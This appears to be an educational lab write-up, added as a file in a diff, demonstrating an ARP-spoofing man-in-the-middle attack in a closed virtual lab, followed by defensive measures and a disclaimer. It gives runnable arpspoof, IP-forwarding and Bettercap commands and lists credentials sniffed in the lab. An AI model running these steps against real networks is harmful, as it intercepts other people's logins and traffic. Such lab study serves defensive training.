@@ -1,0 +1,66 @@
+# Man-in-the-Middle (MITM) Attack using ARP Spoofing & Bettercap
+# Author: Alay Patel
+
+1. PROJECT OVERVIEW
+This project explores fundamental vulnerabilities within the Address Resolution Protocol (ARP) and demonstrates how these weaknesses can be exploited to perform a Man-in-the-Middle (MITM) attack to intercept sensitive data, such as login credentials, from a target machine.
+
+2. LAB ENVIRONMENT
+- Host OS: Windows 11 Pro
+- Attacker Machine: Kali Linux
+- Victim Machine: Windows 11 Pro (Virtual Machine)
+- Target Server: Metasploitable 2 (Hosting FTP and HTTP services)
+- Network Config: NAT Network or Bridged mode to simulate a real-world LAN
+
+3. EXECUTION METHODOLOGY (STEP-BY-STEP)
+
+Phase I: Reconnaissance and Discovery
+- Command: nmap -sn -PR 192.168.19.1/24
+- Description: Performed an ARP ping scan to identify active hosts on the local network without a full port scan.
+- Key Targets Found:
+  * Attacker (Kali): 192.168.19.252
+  * Victim (Windows): 192.168.19.132
+  * Metasploit 2: 192.168.19.205
+  * Gateway (Router): 192.168.19.2
+
+Phase II: The Two-Way Spoof
+- Command 1 (Targeting Victim): sudo arpspoof -i eth0 -t 192.168.19.132 192.168.19.2
+- Command 2 (Targeting Router): sudo arpspoof -i eth0 -t 192.168.19.2 192.168.19.132
+- Description: Poisoned the ARP cache of both devices to redirect traffic through the attacker's machine.
+
+Phase III: Enabling IP Forwarding
+- Command: echo 1 > /proc/sys/net/ipv4/ip_forward
+- Description: Instructed the Kali machine to act as a router so the victim does not lose internet connectivity, keeping the attack silent.
+
+Phase IV: Packet Sniffing with Wireshark
+- Tool: Wireshark (Filter applied: ftp or http)
+- Captured Credentials (HTTP):
+  * Username: anonymous.ap
+  * Password: ALAY@3206
+- Captured Credentials (FTP):
+  * Username: msfadmin
+  * Password: msfadmin
+
+4. ADVANCED EXECUTION (BETTERCAP FRAMEWORK)
+Bettercap provides a modular, automated approach to MITM attacks.
+
+Workflow:
+1. Initialization: bettercap -iface eth0
+2. Probe Network: net.probe on
+3. Establish Targets: set arp.spoof.targets 192.168.19.132
+4. Full Duplex Spoofing: set arp.spoof.fullduplex true
+5. Activation: arp.spoof on
+6. Real-time Sniffing: net.sniff on
+
+Bettercap automatically recognizes and extracts authentication strings for FTP and HTTP, printing them directly to the console.
+
+5. DEFENSIVE MEASURES
+- DAI (Dynamic ARP Inspection): Checks ARP packets against a trusted database in high-end switches.
+- VPN (Virtual Private Network): Encrypts traffic so intercepted data remains useless to attackers.
+- Static ARP Entries: Manually map MAC addresses to IPs for critical servers.
+- Modern Protocols: Phase out FTP for SFTP and force web traffic over HTTPS.
+
+6. CONCLUSION
+This project demonstrated the mechanics of a Man-in-the-Middle attack using both manual and automated methods. Understanding these vulnerabilities is vital for Red Teamers to simulate threats and strengthen organizational defenses.
+
+ACADEMIC DISCLAIMER:
+This project was performed in a closed, authorized lab environment for educational and professional auditing purposes only. Unauthorized use of these methods is a criminal offense.
